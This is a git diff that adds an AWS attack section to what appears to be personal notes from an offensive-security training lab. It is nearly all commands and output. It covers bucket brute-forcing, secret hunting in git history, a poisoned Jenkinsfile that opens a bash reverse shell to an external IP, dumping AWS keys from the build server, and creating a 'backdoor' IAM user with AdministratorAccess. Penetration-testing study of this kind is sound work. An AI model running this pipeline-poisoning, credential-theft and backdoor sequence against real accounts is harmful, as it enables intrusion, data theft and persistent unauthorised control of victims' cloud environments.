@@ -79,6 +79,7 @@
 * [Attacking Active Directory Authentication](#Attacking-Active-Directory-Authentication)
 * [Lateral Movement in Active Directory](#Lateral-Movement-in-Active-Directory)
 * [Enumerating AWS Cloud Infrastructure](#Enumerating-AWS-Cloud-Infrastructure)
+* [Attacking AWS Cloud Infrastructure](#Attacking-AWS-Cloud-Infrastructure)
 
 # Useful
 
@@ -3551,7 +3552,7 @@ kali@kali:~$ aws --profile attacker iam create-access-key --user-name enum
 
 ~~~ bash
 kali@kali:~$ aws configure --profile enum
-AWS Access Key ID [None]: AKIAQOMAIGYURE7QCUXU
+AWS Access Key ID [None]: [AWS Access Key ID]
 AWS Secret Access Key [None]: [AWS Secret Access Key]
 Default region name [None]: us-east-1
 Default output format [None]: json
@@ -3788,5 +3789,306 @@ Pacu (offseclab:imported-attacker) > run iam__enum_roles --word-list /tmp/role-n
 ~~~
 
 
+# Attacking AWS Cloud Infrastructure
 
+## Enumeration
+
+### Enumerating the Application
+---
+
+#### Running Enumeration on S3 Bucket
+
+~~~ bash
+kali@kali:~$ head -n 51 /usr/share/wordlists/dirb/common.txt > first50.txt
+
+kali@kali:~$ dirb https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com ./first50.txt
+...
+---- Scanning URL: https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/ ----
++ https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/.git/HEAD (CODE:200|SIZE:23)      
+...
+DOWNLOADED: 50 - FOUND: 1
+~~~
+
+#### Configuring AWS CLI
+
+~~~ bash
+kali@kali:~$ aws configure
+AWS Access Key ID [None]: [AWS Access Key ID]
+AWS Secret Access Key [None]: [AWS Secret Access Key]
+Default region name [None]: us-east-1
+Default output format [None]: 
+~~~
+
+
+#### Listing Bucket
+
+~~~ bash
+kali@kali:~$ aws s3 ls staticcontent-lgudbhv8syu2tgbk
+                           PRE .git/
+                           PRE images/
+                           PRE scripts/
+                           PRE webroot/
+2023-04-04 13:00:52        972 CONTRIBUTING.md
+2023-04-04 13:00:52         79 Caddyfile
+2023-04-04 13:00:52        407 Jenkinsfile
+2023-04-04 13:00:52        850 README.md
+2023-04-04 13:00:52        176 docker-compose.yml
+~~~
+
+
+## Discovering Secrets
+
+### Downloading the Bucket
+---
+
+#### Listing Bucket
+
+~~~ bash
+kali@kali:~$ aws s3 ls staticcontent-lgudbhv8syu2tgbk
+                           PRE .git/
+                           PRE images/
+                           PRE scripts/
+                           PRE webroot/
+2023-04-04 13:00:52        972 CONTRIBUTING.md
+2023-04-04 13:00:52         79 Caddyfile
+2023-04-04 13:00:52        407 Jenkinsfile
+2023-04-04 13:00:52        850 README.md
+2023-04-04 13:00:52        176 docker-compose.yml
+~~~
+
+#### Copy the S3 bucket
+
+~~~ bash
+kali@kali:~$ aws s3 cp s3://staticcontent-lgudbhv8syu2tgbk/README.md ./
+download: s3://staticcontent-lgudbhv8syu2tgbk/README.md to ./README.md
+~~~
+
+
+#### Downloading the S3 bucket
+
+~~~ bash
+kali@kali:~$ mkdir static_content                                     
+
+kali@kali:~$ aws s3 sync s3://staticcontent-lgudbhv8syu2tgbk ./static_content/
+download: s3://staticcontent-lgudbhv8syu2tgbk/.git/COMMIT_EDITMSG to static_content/.git/COMMIT_EDITMSG
+...
+download: s3://staticcontent-lgudbhv8syu2tgbk/images/kittens.jpg to static_content/images/kittens.jpg
+
+kali@kali:~$ cd static_content
+
+kali@kali:~/static_content$ 
+~~~
+
+### Searching for Secrets in Git
+---
+
+#### Installing gitleaks
+
+~~~ bash
+sudo apt update
+sudo apt install -y gitleaks
+~~~
+
+#### Using gitleaks to Search for Secrets
+
+~~~ bash
+kali@kali:~/static_content$ gitleaks detect
+
+    ○
+    │╲
+    │ ○
+    ○ ░
+    ░    gitleaks 
+
+1:58PM INF no leaks found
+1:58PM INF scan completed in 61.787205ms
+~~~
+
+#### Review Git History
+
+~~~ bash
+git log
+~~~
+
+
+#### Review Git Diff
+
+~~~ bash
+git show 64382765366943dd1270e945b0b23dbed3024340
+~~~
+
+
+## Poisoning the Pipeline
+
+
+### Modifying the Pipeline
+---
+
+#### Basic Jenkinsfile - Final Payload
+
+~~~ bash
+pipeline {
+  agent any
+  stages {
+    stage('Send Reverse Shell') {
+      steps {
+        withAWS(region: 'us-east-1', credentials: 'aws_key') {
+          script {
+            if (isUnix()) {
+              sh 'bash -c "bash -i >& /dev/tcp/192.88.99.76/4242 0>&1" & '
+            }
+          }
+        }
+      }
+    }
+  }
+}
+~~~
+
+
+### Enumerating the Builder
+---
+
+#### Discovering AWS Keys
+
+~~~ bash
+jenkins@fcd3cc360d9e:~$ env | grep AWS
+env | grep AWS
+AWS_DEFAULT_REGION=us-east-1
+AWS_REGION=us-east-1
+AWS_SECRET_ACCESS_KEY=[AWS_SECRET_ACCESS_KEY]
+AWS_ACCESS_KEY_ID=[AWS_ACCESS_KEY_ID]
+~~~
+
+
+## Compromising the Environment via Backdoor Account
+
+### Discovering What We Have Access To
+---
+
+#### Configuring a new profile
+
+~~~ bash
+kali@kali:~$ aws configure --profile=CompromisedJenkins                                                           
+AWS Access Key ID [None]: [AWS Access Key ID]
+AWS Secret Access Key [None]: [AWS Secret Access Key]
+Default region name [None]: us-east-1
+Default output format [None]: 
+~~~
+
+
+#### Getting User Name
+
+~~~ bash
+kali@kali:~$ aws --profile CompromisedJenkins sts get-caller-identity
+{
+    "UserId": "AIDAUBHUBEGILTF7TFWME",
+    "Account": "274737132808",
+    "Arn": "arn:aws:iam::274737132808:user/system/jenkins-admin",
+}
+~~~
+
+#### Listing Policies and Group for User
+
+~~~ bash
+kali@kali:~$ aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin
+{
+    "PolicyNames": [
+        "jenkins-admin-role"
+    ]
+}
+
+kali@kali:~$ aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin
+{
+    "AttachedPolicies": []
+}
+
+kali@kali:~$ aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin
+{
+    "Groups": []
+}
+~~~
+
+#### Getting Policy
+
+~~~ bash
+kali@kali:~$ aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
+{
+    "UserName": "jenkins-admin",
+    "PolicyName": "jenkins-admin-role",
+    "PolicyDocument": {
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Sid": "",
+                "Effect": "Allow",
+                "Action": "*",
+                "Resource": "*"
+            }
+        ]
+    }
+}
+~~~
+
+### Creating a Backdoor Account
+---
+
+#### Create User
+
+~~~ bash
+kali@kali:~$ aws --profile CompromisedJenkins iam create-user --user-name backdoor                                  
+{
+    "User": {
+        "Path": "/",
+        "UserName": "backdoor",
+        "UserId": "AIDAUBHUBEGIPX2SBIHLB",
+        "Arn": "arn:aws:iam::274737132808:user/backdoor",
+    }
+}
+~~~
+
+
+#### Attach Admin Policy
+
+~~~ bash
+kali@kali:~$ aws --profile CompromisedJenkins iam attach-user-policy  --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+kali@kali:~$ 
+~~~
+
+#### Get User Credentials
+
+~~~ bash
+kali@kali:~$ aws --profile CompromisedJenkins iam create-access-key --user-name backdoor
+{
+    "AccessKey": {
+        "UserName": "backdoor",
+        "AccessKeyId": "[AccessKeyId]",
+        "Status": "Active",
+        "SecretAccessKey": "[SecretAccessKey]",
+    }
+}
+~~~
+
+
+
+#### Configure profile and list policies
+
+~~~ bash
+kali@kali:~$ aws configure --profile=backdoor                                           
+AWS Access Key ID [None]: [AWS Access Key ID]
+AWS Secret Access Key [None]: [AWS Secret Access Key]
+Default region name [None]: us-east-1
+Default output format [None]:  
+
+kali@kali:~$ aws --profile backdoor iam list-attached-user-policies --user-name backdoor
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "AdministratorAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+        }
+    ]
+}
+~~~
 
